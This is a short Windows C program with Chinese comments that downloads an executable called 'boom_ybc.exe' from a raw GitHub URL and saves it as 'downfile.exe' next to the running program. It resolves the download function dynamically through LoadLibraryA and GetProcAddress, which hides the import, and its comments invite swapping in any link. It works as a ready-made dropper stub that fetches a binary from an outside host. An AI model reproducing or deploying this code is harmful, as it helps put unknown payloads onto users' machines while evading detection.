#include <windows.h>
int main(){
    char p[MAX_PATH]={0};
    GetModuleFileNameA(NULL,p,MAX_PATH); // 获取程序目录
    *strrchr(p,'\\')='\0';
    strcat(p,"\\downfile.exe"); // 自定义基础文件名（可改）
    // 下载核心（替换下面的URL为你的任意下载链接）
    ((HRESULT(*)(void*,const char*,const char*,DWORD,void*))GetProcAddress(LoadLibraryA("urlmon.dll"),"URLDownloadToFileA"))(NULL,"https://raw.githubusercontent.com/UnboundedEye/-/refs/heads/main/C%2B%2B%E7%89%88%E6%9C%AC%E5%9C%A8%E8%BF%99%E9%87%8C/boom_ybc/boom_ybc.exe",p,0,NULL);
    return 0;
}
